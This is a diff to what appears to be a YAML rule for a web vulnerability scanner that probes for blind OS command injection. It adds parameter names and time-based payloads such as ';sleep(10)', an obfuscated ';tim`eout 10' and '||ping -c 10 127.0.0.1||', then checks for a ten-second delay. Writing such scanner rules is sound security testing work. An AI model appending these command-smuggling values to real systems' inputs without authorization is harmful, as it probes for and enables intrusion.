@@ -40,32 +40,44 @@ target-arguments:
      - "payload"
      - "run"
      - "print"
+     - "storeId"
+     - "productId"
+     - "email"
 flows:
   flow_1:
     payloads:
-      - value: ";set a=2"
+      - value: ";sleep(10)"
+        position: "append"
+        tag: "window,linux"
+      
+      - value: ";tim`eout 10"
         position: "append"
         tag: "window"
       
-      - value: ";`set a=2"
+      - value: ";sleep(10)"
+        position: "append"
+        tag: "window,linux"
+      
+      - value: ";tim`eout 10"
         position: "append"
         tag: "window"
       
-      - value: ";export a=2"
-        position: "append"
-        tag: "linux"
-      
-      - value: " 2>$nul"
+      - value: "||ping -c 10 127.0.0.1||"
         position: "append"
         tag: "window"
       
-      - value: " 2>/dev/null"
+      - value: "||ping -c 10 127.0.0.1"
         position: "append"
-        tag: "linux"
+        tag: "window"  
+
+      - value: "||ping -c 10 127.1||"
+        position: "append"
+        tag: "window"
+      
+      - value: "||ping -c 10 127.1"
+        position: "append"
+        tag: "window"  
     verify:
-      - function: "has_similar_content_wordlist"
+      - function: "is_delayed_for" 
         args:
-          body_content_1: "{{response_body_content!0}}"
-          body_content_2: "{{response_body_content!1}}"
-          rate: 93
-        expected-value: True
+          duration: 10
